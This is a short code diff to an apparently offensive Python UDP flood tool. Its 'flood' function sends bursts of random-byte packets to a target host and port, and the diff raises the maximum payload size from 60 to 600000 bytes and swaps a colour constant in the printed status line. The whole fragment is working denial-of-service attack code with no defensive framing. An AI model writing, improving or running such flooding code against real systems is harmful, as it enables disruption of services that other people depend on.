@@ -11,7 +11,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 def flood(target):
     for _ in range(16):
         try:
-            payload = random._urandom(random.randint(1, 60))
+            payload = random._urandom(random.randint(1, 600000))
             sock.sendto(payload, (target[0], target[1]))
         except Exception as e:
             print(
@@ -19,5 +19,5 @@ def flood(target):
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.PURPLE}UDP random packet sent! Payload size: {len(payload)}. {Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.MAGENTA}UDP random packet sent! Payload size: {len(payload)}. {Fore.RESET}"
             )
